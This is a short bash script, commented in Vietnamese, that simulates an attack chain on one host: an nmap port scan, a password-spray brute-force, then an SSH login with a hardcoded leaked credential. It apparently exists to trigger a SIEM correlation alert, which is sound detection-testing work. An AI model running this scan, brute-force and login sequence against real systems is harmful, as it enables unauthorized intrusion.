#!/bin/bash
# Chuoi tan cong day du vao 1 target: recon -> brute-force -> dang nhap thanh cong.
# Kich hoat rule tuong quan brute_force_then_success (do mat khau roi vao duoc).
set -u
TARGET="${1:-fs01}"
GOODUSER="${2:-ketoan1}"
GOODPASS="${3:-Ketoan@123}"

echo "===== [1/3] RECON $TARGET ====="
nmap -Pn -sS -T4 --top-ports 50 "$TARGET"

echo "===== [2/3] BRUTE-FORCE $TARGET ====="
/opt/attack/spray.sh "$TARGET" 6

echo "===== [3/3] DANG NHAP THANH CONG (tai khoan da lo) ====="
sshpass -p "$GOODPASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "$GOODUSER@$TARGET" 'id; hostname; echo VAO_DUOC_ROI' 2>&1 | tail -4
echo "===== xong. Kiem tra alert tren dashboard ====="
